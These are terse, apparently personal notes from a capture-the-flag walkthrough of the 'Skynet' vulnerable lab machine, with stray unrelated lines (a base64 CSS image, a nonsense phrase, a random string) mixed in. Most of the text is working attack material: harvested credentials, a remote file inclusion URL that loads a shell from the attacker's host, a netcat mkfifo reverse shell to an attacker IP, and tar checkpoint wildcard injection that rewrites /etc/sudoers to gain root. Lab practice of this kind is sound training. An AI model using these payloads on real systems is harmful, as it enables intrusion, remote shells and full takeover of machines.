Skynet
  
A vulnerable Terminator themed Linux machine.

on css -- nothing important
background: url('data:image/gif;base64,R0lGODlhHAAmAKIHAKqqqsvLy0hISObm5vf394uLiwAAAP///yH5BAEAAAcALAAAAAAcACYAAAO9eLpMIMYIQJi9DcYtKv6KtnHgB4yoAZSXKAyDy1rjoAzjzOQLrx8+4OanCAZnxiExGSEKmz3lj2lwUq3SZ3WZPbKuXGgxu9t4tLYDTkpIRQILF0x2G4lWipM7gj/oJQUkcXsCDCIFATULBCIcZ2tvB3QLDxETFnR/BgU/gRt9jX0gnpYMkJZpFzEoqQqJKAIBaQOVKHAXr3t7txgBjboSvB8EpLoFZywOAo3LFE5lYs/QW9LT1TRk1V7S2xYJADs');

milesdyson is username
cyborg007haloterminator pass, 
got from samba
using smbmap
emails have a password. tried squirellmail vulns to no sucess. 
in samba we have important.txt that hides hidden directory 

balls have zero to me to me to me to me to me to me to me to me to

)s{A&2Z=F^n_E.B`

 smbclient \\\\10.10.189.118\\milesdyson -U milesdyson

vuln for cuppa
 10.10.189.118/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.2.66:9002/shell.php




 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.2.66 4200 >/tmp/f" > shell.sh touch "/var/www/html--checkpoint-action=exec=sh shell.sh" touch "/var/www/html/--checkpoint=1"


I moved to /var/www/html (which is the directory being tar'd) and ran the following.

echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1
After short while I ran "sudo -l" with the following results.

User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
I am now able to run "sudo cat /root/root.txt" :)